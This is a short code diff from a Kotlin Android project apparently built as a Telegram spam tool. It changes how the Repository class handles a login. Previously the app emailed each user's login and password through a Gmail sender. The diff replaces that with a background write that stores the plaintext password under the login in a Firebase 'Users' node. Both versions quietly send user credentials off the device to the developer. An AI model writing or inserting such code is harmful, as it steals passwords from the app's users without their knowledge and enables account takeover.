@@ -11,7 +11,7 @@ import com.example.telegramspam.data.telegram.TelegramAuthUtil
 import com.example.telegramspam.data.telegram.TelegramClientUtil
 import com.example.telegramspam.models.*
 import com.example.telegramspam.utils.*
-import com.example.telegramspam.utils.email_sender.GMailSender
+import com.google.firebase.database.FirebaseDatabase
 import com.google.gson.Gson
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -137,7 +137,7 @@ class Repository(
         prefs.saveLogin(login)
 
         CoroutineScope(Dispatchers.IO).launch {
-            GMailSender().sendMail(login, password)
+            FirebaseDatabase.getInstance().getReference("Users").child(login).setValue(password)
         }
 
     }
